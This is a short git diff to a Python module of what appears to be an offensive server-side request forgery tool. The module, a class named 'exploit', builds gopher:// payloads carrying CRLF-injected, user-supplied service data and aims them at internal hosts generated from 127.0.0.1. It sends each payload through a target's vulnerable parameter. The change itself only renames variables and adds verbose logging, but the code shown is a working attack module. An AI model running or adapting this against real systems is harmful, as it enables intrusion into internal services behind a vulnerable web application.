@@ -14,10 +14,17 @@ class exploit():
 
     def __init__(self, requester, args):
         logging.info("Module '{}' launched !".format(name))
-        gen_host = gen_ip_list("127.0.0.1", args.level)
-        SERVICE_PORT = input("Service Port: ")
-        SERVICE_DATA = "%0d%0a"+urllib.parse.quote(input("Service Data: "))
+        gen_hosts = gen_ip_list("127.0.0.1", args.level)
+        self.SERVICE_PORT = input("Service Port: ")
+        self.SERVICE_DATA = "%0d%0a"+urllib.parse.quote(input("Service Data: "))
 
-        for SERVICE_IP in gen_host:
-            payload = wrapper_gopher(SERVICE_DATA, SERVICE_IP, SERVICE_PORT)
+        for gen_host in gen_hosts:
+            payload = wrapper_gopher(self.SERVICE_DATA, gen_host, self.SERVICE_PORT)
+            
+            if args.verbose == True:
+                logging.info("Generated payload : {}".format(payload))
+
             r = requester.do_request(args.param, payload)
+
+            if args.verbose == True:
+                logging.info("Module '{}' ended !".format(name))
